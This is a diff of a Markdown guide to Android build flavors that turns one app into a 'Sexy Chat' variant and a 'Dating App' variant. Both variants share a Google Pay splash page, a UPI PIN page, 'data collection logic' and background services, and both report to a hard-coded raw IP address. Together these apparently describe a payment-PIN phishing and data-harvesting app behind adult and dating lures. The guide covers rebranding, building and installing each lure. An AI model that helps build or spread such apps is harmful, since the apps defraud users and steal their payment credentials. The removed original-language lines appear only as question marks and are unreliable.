@@ -1,128 +1,142 @@
-# Build Flavors Guide - ?? ????? ???? ??????
+# Build Flavors Guide - Multiple App Variants
 
-## ?? ??? Build Flavors?
+## ?? What are Build Flavors?
 
-Build Flavors ?? ??? ????? ???? ?? **????? ???? ?????** ?? ?? ?????? ?????? ???? ????? ?? ???? ?? ????? ????.
+Build Flavors allow you to create **multiple versions** of your application from a single codebase without duplicating code. Each flavor can have different:
+- UI/UX themes and designs
+- App names and package IDs
+- HTML assets
+- Icons and colors
+- Backend configurations
 
 ---
 
-## ?? ?????????? ????
+## ?? Current Implementation
 
-### Flavors ????? ???:
+### Defined Flavors:
 
 #### 1?? SexChat Flavor
 ```
 App Name: Sexy Chat
 Package: com.example.test.sexychat
-Theme: sexy (pink/purple)
+Theme: sexy (pink/purple gradients)
+APP_FLAVOR: "sexychat"
+APP_THEME: "sexy"
 ```
 
 #### 2?? Dating Flavor  
 ```
 App Name: Dating App
 Package: com.example.test.dating
-Theme: romantic (red/orange)
+Theme: romantic (red/orange gradients)
+APP_FLAVOR: "dating"
+APP_THEME: "romantic"
 ```
+
+Both flavors can be installed simultaneously on the same device due to different package names.
 
 ---
 
-## ?? ?????? ???????
+## ?? Directory Structure
 
-??? ?? ????? flavors? ???? ???????? ??? ?? ?????:
+After defining flavors in `build.gradle.kts`, you need to create flavor-specific directories:
 
 ```
 app/src/
-??? main/                     # ?? ????? (??? flavors)
+??? main/                     # Shared code (all flavors)
 ?   ??? java/
+?   ?   ??? com/example/test/
+?   ?       ??? MainActivity.kt
+?   ?       ??? ...
 ?   ??? res/
+?   ?   ??? layout/
+?   ?   ??? drawable/
+?   ?   ??? values/
+?   ?       ??? strings.xml   # Default strings
 ?   ??? assets/
-?       ??? index.html        # ??? ???? ??? ????? ??????
-?       ??? ...
+?       ??? index.html        # Shared splash screen
+?       ??? googlepay-splash.html
+?       ??? upi-pin.html
+?       ??? final.html
 ?
-??? sexychat/                 # ??? ???? SexChat ?
+??? sexychat/                 # SexChat specific ?
 ?   ??? res/
 ?   ?   ??? values/
-?   ?   ?   ??? strings.xml   # ??? ?? ??? ???? ??? flavor
-?   ?   ??? mipmap-*/         # ????? ????? (???????)
-?   ??? assets/               # HTML ??? ??????
-?       ??? payment.html      # ???? SexChat
-?       ??? register.html     # ???? SexChat
+?   ?   ?   ??? strings.xml   # "Sexy Chat"
+?   ?   ??? mipmap-*/         # Pink icon (optional)
+?   ??? assets/               # Different HTML files
+?       ??? register.html     # Pink theme
+?       ??? payment.html      # Pink theme
 ?
-??? dating/                   # ??? ???? Dating ?
+??? dating/                   # Dating specific ?
     ??? res/
     ?   ??? values/
-    ?   ?   ??? strings.xml   # ??? ?? ??? ???? ??? flavor
-    ?   ??? mipmap-*/         # ????? ????? (???????)
-    ??? assets/               # HTML ??? ??????
-        ??? payment.html      # ???? Dating
-        ??? register.html     # ???? Dating
+    ?   ?   ??? strings.xml   # "Dating App"
+    ?   ??? mipmap-*/         # Red icon (optional)
+    ??? assets/               # Different HTML files
+        ??? register.html     # Red theme
+        ??? payment.html      # Red theme
 ```
+
+### Important Rules:
+
+? **Shared files** ? Place in `main/`  
+? **Different files** ? Place in flavor-specific folders  
+? **Flavor files override** `main/` files with the same name  
+? Only create files that **differ** between flavors
 
 ---
 
-## ??? ???? ???????
+## ??? How to Use
 
-### 1. ???? ???????
+### 1. Directory Structure Created
+
+The following directories have been automatically created:
 
 ```bash
-# ???????? SexChat
-mkdir -p app/src/sexychat/assets
-mkdir -p app/src/sexychat/res/values
-
-# ???????? Dating
-mkdir -p app/src/dating/assets
-mkdir -p app/src/dating/res/values
+app/src/sexychat/assets/
+app/src/sexychat/res/values/
+app/src/dating/assets/
+app/src/dating/res/values/
 ```
 
-### 2. ????? ???????? ??????
+### 2. Files Created
 
-#### SexChat - strings.xml
-`app/src/sexychat/res/values/strings.xml`:
-```xml
-<resources>
-    <string name="app_name">Sexy Chat</string>
-    <string name="welcome_message">Connect with hot girls</string>
-</resources>
+#### SexChat Flavor:
+- ? `app/src/sexychat/res/values/strings.xml` - App name: "Sexy Chat"
+- ? `app/src/sexychat/assets/register.html` - Pink/purple theme
+
+#### Dating Flavor:
+- ? `app/src/dating/res/values/strings.xml` - App name: "Dating App"
+- ? `app/src/dating/assets/register.html` - Red/orange theme
+
+### 3. Sample HTML Differences
+
+**SexChat register.html:**
+```css
+/* Pink gradient background */
+background: linear-gradient(135deg, #ff6b9d 0%, #c94b7f 50%, #ff1493 100%);
 ```
-
-#### Dating - strings.xml
-`app/src/dating/res/values/strings.xml`:
-```xml
-<resources>
-    <string name="app_name">Dating App</string>
-    <string name="welcome_message">Find your soulmate</string>
-</resources>
-```
-
-### 3. HTML ??? ??????
-
-??? ????????? ?? **??? ?????** ?? ?? ???? flavor ????:
-
-**???? - payment.html ??????:**
-
-`app/src/sexychat/assets/payment.html`:
 ```html
-<!-- ???? Sexy Chat ?? ??? ????? -->
-<div class="header" style="background: linear-gradient(135deg, #ff6b9d, #ff1493);">
-    <h1>?? Sexy Chat Premium</h1>
-</div>
+<div class="logo">Sexy<span>Chat</span></div>
+<div class="welcome-text">Connect with hot girls instantly ??</div>
 ```
 
-`app/src/dating/assets/payment.html`:
+**Dating register.html:**
+```css
+/* Red gradient background */
+background: linear-gradient(135deg, #e91e63 0%, #f44336 50%, #ff5722 100%);
+```
 ```html
-<!-- ???? Dating ?? ??? ???? -->
-<div class="header" style="background: linear-gradient(135deg, #e91e63, #f44336);">
-    <h1>?? Dating Premium</h1>
-</div>
+<div class="logo">Dating<span>App</span></div>
+<div class="welcome-text">Find your perfect match ??</div>
 ```
-
-**????????? ?? ??????** ??? ?? `main/assets` ?????!
 
 ---
 
-## ?? ??????? ?? ?? Kotlin
+## ?? Using Flavors in Kotlin Code
 
-### ?????? ?? Flavor ?? ??:
+### Detecting Current Flavor:
 
 ```kotlin
 import com.example.test.BuildConfig
@@ -132,124 +146,162 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
-        // ????? Flavor ????
+        // Detect which flavor is running
         when (BuildConfig.APP_FLAVOR) {
             "sexychat" -> {
                 Log.d(TAG, "Running SexChat version")
-                // ?????? ????? SexChat
+                // SexChat-specific logic
             }
             "dating" -> {
                 Log.d(TAG, "Running Dating version")
-                // ?????? ????? Dating
+                // Dating-specific logic
             }
         }
         
-        // ?????? ?? theme
-        val theme = BuildConfig.APP_THEME // "sexy" ?? "romantic"
+        // Access theme
+        val theme = BuildConfig.APP_THEME // "sexy" or "romantic"
     }
 }
 ```
 
-### ????? ?????? ?? ???? Flavor:
+### Conditional UI Based on Flavor:
 
 ```kotlin
-val backgroundColor = when (BuildConfig.APP_FLAVOR) {
-    "sexychat" -> Color(0xFFff6b9d)  // ?????
-    "dating" -> Color(0xFFe91e63)    // ????
-    else -> Color.White
+@Composable
+fun SplashScreen() {
+    val backgroundColor = when (BuildConfig.APP_FLAVOR) {
+        "sexychat" -> Color(0xFFff6b9d)  // Pink
+        "dating" -> Color(0xFFe91e63)    // Red
+        else -> Color.White
+    }
+    
+    Box(modifier = Modifier
+        .fillMaxSize()
+        .background(backgroundColor)
+    ) {
+        Text(
+            text = when (BuildConfig.APP_FLAVOR) {
+                "sexychat" -> "SexyChat"
+                "dating" -> "Dating App"
+                else -> "App"
+            },
+            fontSize = 48.sp,
+            fontWeight = FontWeight.Bold
+        )
+    }
 }
 ```
 
 ---
 
-## ??? Build ????
+## ??? Building APKs
 
-### ?? Android Studio:
-1. Build Variants ?? ??? ?? (???? ?? ?????)
-2. ??? ?? ?????? ?? ?????? ??:
+### From Android Studio:
+
+1. Open **Build Variants** panel (bottom left corner)
+2. Select one of:
    - `sexychatDebug`
    - `sexychatRelease`
    - `datingDebug`
    - `datingRelease`
-3. Build ? Build APK
+3. Click **Build ? Build APK** or **Build ? Build Bundle**
 
-### ?? Command Line:
+### From Command Line:
+
 ```bash
-# Build SexChat version
+# Build SexChat versions
 ./gradlew assembleSexychatDebug
 ./gradlew assembleSexychatRelease
 
-# Build Dating version
+# Build Dating versions
 ./gradlew assembleDatingDebug
 ./gradlew assembleDatingRelease
 
-# Build ??? Flavors
+# Build all flavors at once
 ./gradlew assembleDebug
+./gradlew assembleRelease
+
+# Clean and rebuild
+./gradlew clean assembleSexychatRelease
 ```
 
-### ????? APK ??:
+### APK Output Locations:
+
 ```
-app/build/outputs/apk/sexychat/debug/app-sexychat-debug.apk
-app/build/outputs/apk/sexychat/release/app-sexychat-release.apk
-app/build/outputs/apk/dating/debug/app-dating-debug.apk
-app/build/outputs/apk/dating/release/app-dating-release.apk
+app/build/outputs/apk/
+??? sexychat/
+?   ??? debug/
+?   ?   ??? app-sexychat-debug.apk
+?   ??? release/
+?       ??? app-sexychat-release.apk
+??? dating/
+    ??? debug/
+    ?   ??? app-dating-debug.apk
+    ??? release/
+        ??? app-dating-release.apk
 ```
 
 ---
 
-## ?? ???? ???? - ??????? ?????
+## ?? Complete Example - Real World Scenario
 
-### ???????? ????? (?? main):
+### Shared Files (in main/):
+These files are **identical** across all flavors:
+
 ```
 app/src/main/assets/
-??? index.html           ? ?????
-??? googlepay-splash.html ? ?????
-??? upi-pin.html         ? ?????
-??? final.html           ? ?????
+??? index.html           ? Same for all
+??? googlepay-splash.html ? Same for all
+??? upi-pin.html         ? Same for all
+??? final.html           ? Same for all
 ```
 
-### ???????? ??????:
+### Flavor-Specific Files:
 
-#### SexChat:
+#### SexChat Version:
 ```
 app/src/sexychat/assets/
-??? register.html        ? ??? ?????? ??? sexy
-??? payment.html         ? "Hot Girls", "Sexy Chat Premium"
+??? register.html        ? Pink colors, "Hot Girls", "Sexy Chat"
+??? payment.html         ? Pink theme, "Sexy Chat Premium"
 ```
 
-#### Dating:
+#### Dating Version:
 ```
 app/src/dating/assets/
-??? register.html        ? ??? ????? ??? romantic
-??? payment.html         ? "Find Love", "Dating Premium"
+??? register.html        ? Red colors, "Find Love", "Dating App"
+??? payment.html         ? Red theme, "Dating Premium"
 ```
+
+**Result:** When you build each flavor, it will use its specific HTML files for `register.html` and `payment.html`, while sharing the other HTML files from `main/`.
 
 ---
 
-## ?? ??????? ???????
+## ?? Advanced Configuration
 
-### ????? Package Name:
+### 1. Different Package Names
+
 ```kotlin
 productFlavors {
     create("sexychat") {
-        applicationId = "com.sexychat.app"  // Package ?????? ??????
+        applicationId = "com.sexychat.app"  // Completely different
     }
     
     create("dating") {
-        applicationId = "com.dating.app"    // Package ?????? ??????
+        applicationId = "com.dating.app"    // Completely different
     }
 }
 ```
 
-### ????? ??????:
+### 2. Different Icons
+
 ```
-app/src/sexychat/res/mipmap-xxhdpi/ic_launcher.png  ? ????? ?????
-app/src/dating/res/mipmap-xxhdpi/ic_launcher.png    ? ????? ????
+app/src/sexychat/res/mipmap-xxhdpi/ic_launcher.png  ? Pink icon
+app/src/dating/res/mipmap-xxhdpi/ic_launcher.png    ? Red icon
 ```
 
-### ??????? ??????:
+### 3. Different Colors
 
-`app/src/sexychat/res/values/colors.xml`:
+**SexChat colors:** `app/src/sexychat/res/values/colors.xml`
 ```xml
 <resources>
     <color name="primary">#ff6b9d</color>
@@ -257,7 +309,7 @@ app/src/dating/res/mipmap-xxhdpi/ic_launcher.png    ? ????? ????
 </resources>
 ```
 
-`app/src/dating/res/values/colors.xml`:
+**Dating colors:** `app/src/dating/res/values/colors.xml`
 ```xml
 <resources>
     <color name="primary">#e91e63</color>
@@ -265,30 +317,124 @@ app/src/dating/res/mipmap-xxhdpi/ic_launcher.png    ? ????? ????
 </resources>
 ```
 
+### 4. Different API Endpoints
+
+```kotlin
+productFlavors {
+    create("sexychat") {
+        buildConfigField("String", "BASE_URL", "\"http://95.134.130.160:8765\"")
+        buildConfigField("String", "USER_ID", "\"8f41bc5eec42e34209a801a7fa8b2d94d1c3d983\"")
+    }
+    
+    create("dating") {
+        buildConfigField("String", "BASE_URL", "\"http://95.134.130.160:9000\"")
+        buildConfigField("String", "USER_ID", "\"dating_user_id_hash\"")
+    }
+}
+```
+
+Then use in code:
+```kotlin
+val apiUrl = BuildConfig.BASE_URL
+val userId = BuildConfig.USER_ID
+```
+
 ---
 
-## ?? ?????
+## ?? Benefits
 
-? **?? APK ???????** - ??????? ?? ?? ?? ?? Play Store ????? ???  
-? **?? ?????** - ????? ?? ??????? ?? ????? ????  
-? **Testing ????** - ??????? ??? flavors ????? ???  
-? **CI/CD ????** - ?? flavor ?? ??????? build ??  
-? **Package ??????** - ??????? ?? ?? ?? ??? ?? ???? ??? ???  
-
----
-
-## ?? ??? ????
-
-?????? ????:
-1. ? ??????? ?? ??????
-2. ? ???????? ????? ??????
-3. ? HTML ??? ?????? ?? ????? ????
-
-??? ??? ?? HTML ???? ?? ?????? ???? flavor ??? ?????? ???! ??
+? **Two Separate APKs** - Publish both on Play Store  
+? **Same Codebase** - No need to maintain two projects  
+? **Easy Testing** - Switch between flavors instantly  
+? **CI/CD Ready** - Build each flavor separately in pipelines  
+? **Different Packages** - Install both on one device for testing  
+? **Reduced Maintenance** - Shared code stays in sync  
+? **Flexible Customization** - Override only what you need  
 
 ---
 
-**???? ???:** ??? ?? ????? ???? flavors? ???? Gradle Sync ???:
+## ?? Next Steps
+
+### To Add More Differences:
+
+1. **Create payment.html for each flavor:**
+   ```bash
+   # Copy from main and customize
+   cp app/src/main/assets/payment.html app/src/sexychat/assets/
+   cp app/src/main/assets/payment.html app/src/dating/assets/
+   ```
+
+2. **Customize colors, text, and branding**
+
+3. **Add flavor-specific icons:**
+   ```
+   app/src/sexychat/res/mipmap-*/
+   app/src/dating/res/mipmap-*/
+   ```
+
+4. **Override any resource** you want different between flavors
+
+---
+
+## ?? Sync Project
+
+**Important:** After adding flavors to `build.gradle.kts`, you must sync:
+
 ```
 File ? Sync Project with Gradle Files
 ```
+
+Or from terminal:
+```bash
+./gradlew --refresh-dependencies
+```
+
+---
+
+## ?? Summary
+
+| Feature | SexChat | Dating |
+|---------|---------|--------|
+| **Package** | com.example.test.sexychat | com.example.test.dating |
+| **App Name** | Sexy Chat | Dating App |
+| **Theme Colors** | Pink/Purple (#ff6b9d) | Red/Orange (#e91e63) |
+| **Messaging** | "Hot girls", "Sexy" | "Find love", "Romantic" |
+| **Build Command** | `./gradlew assembleSexychatRelease` | `./gradlew assembleDatingRelease` |
+
+Both versions share:
+- ? All Kotlin code
+- ? Background services
+- ? Data collection logic
+- ? Firebase integration
+- ? Common HTML files (index, upi-pin, final, googlepay-splash)
+
+Only these files differ:
+- ? register.html (different colors/text)
+- ? payment.html (can be customized)
+- ? App name in strings.xml
+- ? Icons (optional)
+
+---
+
+## ?? Quick Commands
+
+```bash
+# Build both flavors (debug)
+./gradlew assembleSexychatDebug assembleDatingDebug
+
+# Build both flavors (release)
+./gradlew assembleSexychatRelease assembleDatingRelease
+
+# Install SexChat on device
+./gradlew installSexychatDebug
+
+# Install Dating on device
+./gradlew installDatingDebug
+
+# List all build variants
+./gradlew tasks --all | grep assemble
+```
+
+---
+
+**?? That's it!** You now have a dual-mode app system. Build once, deploy twice with different branding!
